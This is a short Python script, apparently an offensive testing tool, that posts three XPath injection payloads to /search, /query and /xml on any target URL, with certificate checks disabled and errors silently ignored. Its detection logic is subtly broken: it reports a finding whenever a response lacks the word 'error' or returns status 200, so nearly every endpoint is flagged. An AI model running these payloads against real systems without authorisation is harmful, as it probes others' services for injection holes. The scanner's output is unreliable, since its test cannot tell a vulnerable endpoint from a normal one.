#!/usr/bin/env python3
"""
XPath Injection Scanner
Tests XPath endpoints for injection
"""

import requests
import argparse
import warnings
warnings.filterwarnings('ignore')

PAYLOADS = [
    "' or '1'='1",
    "' or ''='",
    "' or 1=1--",
]

def scan(target):
    print(f"[*] XPath Injection Scanner - {target}")
    print("="*50)
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    found = []
    xpath_paths = ['/search', '/query', '/xml']
    
    for path in xpath_paths:
        for payload in PAYLOADS:
            try:
                r = requests.post(target + path, data={'q': payload}, timeout=10, verify=False)
                if 'error' not in r.text.lower() or r.status_code == 200:
                    print(f"[?] XPath: {path}")
                    found.append(path)
            except:
                pass
    
    print("\n" + "="*50)
    print(f"[*] Found {len(found)} potential issues")
    
    return found

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='XPathi Scanner')
    parser.add_argument('target', help='Target URL')
    args = parser.parse_args()
    scan(args.target)